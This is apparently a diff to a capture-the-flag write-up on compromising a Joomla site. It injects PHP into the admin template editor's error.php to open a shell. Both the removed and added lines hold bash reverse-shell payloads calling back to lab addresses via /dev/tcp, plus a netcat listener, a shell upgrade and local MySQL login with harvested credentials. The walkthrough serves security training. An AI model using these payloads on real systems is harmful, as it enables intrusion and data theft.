@@ -84,16 +84,21 @@ Now with these credentials we can gain access to that admin portal we discovered
 
 If we navigate to System > Site Templates > Cassiopeia Details and Files, we can see current template contents.
 
-Lets attatch malicious PHP code to the end of error.php that'll enable us to get a shell.
+Lets attatch malicious PHP code to the error.php that'll enable us to get a shell.
 
-After adding our payload, save the file and then lets host the bash script that will be downloaded and executed on the target.
+    system('bash -c "bash -i >& /dev/tcp/10.10.14.159/1111 0>&1"');
 
-    echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+After adding our payload, lets set up a netcat listener
 
-The above one-liner command will create a bash script named rev.sh in our current working
-directory; this is what we will use to initiate the reverse shell connection to our Netcat listener.
-We then start a Python web server on our local machine on port 8080 to host the file
+    nc -lvnp 1111
 
-    python3 -m http.server 8080
+Doing
+    ss -tlpm shows us open ports, and we see thart 3306 and 33060 are listening locally whcih are ports used by MySQL by default.
 
-Now lets start a Netcat listener to catch the reverse shell connection once the script executes....
+Lets upgrade our current shell so that we can interact with MySQL properly
+
+    script /dev/null -c bash
+
+Now lets use the credentials we discovered previously to connect to the local db
+
+    mysql -u lewis -p
